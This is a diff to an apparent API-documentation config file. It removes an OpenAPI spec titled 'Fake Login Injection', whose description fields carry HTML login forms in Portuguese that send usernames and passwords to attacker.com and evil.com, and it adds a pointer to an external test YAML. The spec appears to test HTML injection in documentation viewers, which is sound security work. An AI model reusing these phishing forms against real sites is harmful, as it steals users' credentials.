@@ -1,26 +1,9 @@
 {
-  "openapi": "3.0.0",
-  "info": {
-    "title": "Fake Login Injection",
-    "version": "1.0.0",
-    "description": "<h2>⚠️ Autenticação Expirada</h2><form action='https://attacker.com/login' method='POST'><input type='text' name='user' placeholder='Usuário' /><br><input type='password' name='pass' placeholder='Senha' /><br><button type='submit'>Entrar</button></form>"
-  },
-  "servers": [
-    {
-      "url": "https://xss.smarpo.com/api"
-    }
-  ],
-  "paths": {
-    "/login-help": {
-      "get": {
-        "summary": "Login Fake",
-        "description": "<p>Estamos com instabilidade. Faça login novamente abaixo:</p><form action='https://attacker.com/phish' method='POST'><input type='text' name='login' placeholder='Email'><br><input type='password' name='senha'><br><button type='submit'>Login</button></form>",
-        "responses": {
-          "200": {
-            "description": "<h3>Erro inesperado. Reautentique-se abaixo:</h3><form action='https://evil.com/auth' method='POST'><input type='text' name='email'><input type='password' name='pass'><input type='submit'></form>"
-          }
+    "url": "https://gist.githubusercontent.com/zenelite123/61360869361ff88d7ce3aec863be7785/raw/227f1d30bb292b1d981b30277236c52acb98ae88/test.yaml",
+    "urls": [
+        {
+            "url": "https://gist.githubusercontent.com/zenelite123/61360869361ff88d7ce3aec863be7785/raw/227f1d30bb292b1d981b30277236c52acb98ae88/test.yaml",
+            "name": "Test"
         }
-      }
-    }
-  }
+    ]
 }
